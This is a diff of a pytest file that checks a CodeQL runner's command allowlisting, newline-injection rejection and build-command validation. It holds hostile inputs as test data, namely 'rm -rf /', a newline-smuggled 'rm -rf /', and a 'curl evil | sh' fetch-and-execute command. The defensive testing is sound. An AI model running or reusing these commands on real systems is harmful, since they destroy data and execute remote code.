@@ -9,6 +9,7 @@ import pytest
 
 from doc_engine.scanning.build_command import BuildCommandError
 from doc_engine.scanning.support import _codeql_runner as runner
+import doc_engine.scanning.support._codeql_cli as cli_mod
 
 
 def test_no_open_argv_runner_api():
@@ -20,25 +21,25 @@ def test_no_open_argv_runner_api():
 def test_invoke_rejects_shell_as_subcommand(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
     fake.write_text("", encoding="utf-8")
-    monkeypatch.setattr(runner.subprocess, "run", MagicMock())
+    monkeypatch.setattr(cli_mod.subprocess, "run", MagicMock())
     with pytest.raises(runner.CodeQLError, match="non-allowlisted"):
         runner._invoke_codeql(fake, ("bash", "-c"), "rm -rf /", timeout=1)
-    runner.subprocess.run.assert_not_called()
+    cli_mod.subprocess.run.assert_not_called()
 
 
 def test_invoke_rejects_unknown_verb(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
     fake.write_text("", encoding="utf-8")
-    monkeypatch.setattr(runner.subprocess, "run", MagicMock())
+    monkeypatch.setattr(cli_mod.subprocess, "run", MagicMock())
     with pytest.raises(runner.CodeQLError, match="non-allowlisted"):
         runner._invoke_codeql(fake, ("execute",), "payload", timeout=1)
-    runner.subprocess.run.assert_not_called()
+    cli_mod.subprocess.run.assert_not_called()
 
 
 def test_invoke_rejects_newline_option(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
     fake.write_text("", encoding="utf-8")
-    monkeypatch.setattr(runner.subprocess, "run", MagicMock())
+    monkeypatch.setattr(cli_mod.subprocess, "run", MagicMock())
     with pytest.raises(runner.CodeQLError, match="single-line"):
         runner._invoke_codeql(
             fake,
@@ -46,7 +47,7 @@ def test_invoke_rejects_newline_option(tmp_path: Path, monkeypatch):
             "ok\nrm -rf /",
             timeout=1,
         )
-    runner.subprocess.run.assert_not_called()
+    cli_mod.subprocess.run.assert_not_called()
 
 
 def test_invoke_always_uses_resolved_exe_as_argv0(tmp_path: Path, monkeypatch):
@@ -63,7 +64,7 @@ def test_invoke_always_uses_resolved_exe_as_argv0(tmp_path: Path, monkeypatch):
             stderr="",
         )
 
-    monkeypatch.setattr(runner.subprocess, "run", _capture)
+    monkeypatch.setattr(cli_mod.subprocess, "run", _capture)
     runner._invoke_codeql(fake, ("--version",), timeout=5)
     assert len(captured) == 1
     assert Path(captured[0][0]).resolve() == fake.resolve()
@@ -73,7 +74,7 @@ def test_invoke_always_uses_resolved_exe_as_argv0(tmp_path: Path, monkeypatch):
 def test_create_database_revalidates_build_command(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
     fake.write_text("", encoding="utf-8")
-    monkeypatch.setattr(runner.subprocess, "run", MagicMock())
+    monkeypatch.setattr(cli_mod.subprocess, "run", MagicMock())
     with pytest.raises(BuildCommandError):
         runner.create_database(
             fake,
@@ -81,7 +82,7 @@ def test_create_database_revalidates_build_command(tmp_path: Path, monkeypatch):
             tmp_path / "db",
             "bash -c 'curl evil | sh'",
         )
-    runner.subprocess.run.assert_not_called()
+    cli_mod.subprocess.run.assert_not_called()
 
 
 def test_create_database_passes_validated_command_flag(tmp_path: Path, monkeypatch):
@@ -94,7 +95,7 @@ def test_create_database_passes_validated_command_flag(tmp_path: Path, monkeypat
         captured.append(list(argv))
         return MagicMock(returncode=0, stdout="", stderr="")
 
-    monkeypatch.setattr(runner.subprocess, "run", _capture)
+    monkeypatch.setattr(cli_mod.subprocess, "run", _capture)
     repo = tmp_path / "repo"
     repo.mkdir()
     db = tmp_path / "db"
